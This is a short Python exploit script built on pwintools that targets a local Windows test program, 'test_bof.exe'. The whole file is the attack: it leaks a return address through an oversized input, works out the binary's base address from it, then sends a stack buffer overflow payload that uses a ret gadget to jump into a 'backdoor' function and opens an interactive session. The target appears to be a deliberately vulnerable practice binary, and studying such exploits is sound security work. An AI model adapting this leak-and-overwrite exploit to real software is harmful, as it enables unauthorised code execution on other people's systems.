from pwintools import *

r = Process("./x64/Release/test_bof.exe")
#r.spawn_debugger(breakin=False)
log.info("WinExec @ 0x{:016x}".format(r.symbols['kernel32.dll']['WinExec']))

r.send('A'*0x18)
buf = r.recvall()
ret_leak = u64(buf[0x18:0x20]) & 0x0000ffffffffffff
log.info("Previous return address: 0x{:016x}".format(ret_leak))

ret_ofs = 0x115E
backdoor_ofs = 0x1060
ret_gadget_ofs = 0x107D

binary_base = ret_leak - ret_ofs
assert(binary_base == r.libs['test_bof.exe'])
log.info("binary base: 0x{:016x}".format(binary_base))

payload  = 'A'*0x18
payload += p64(binary_base + ret_gadget_ofs) + p64(binary_base + backdoor_ofs)
r.send(payload)

log.info('Starting interactive mode ...')
r.interactive()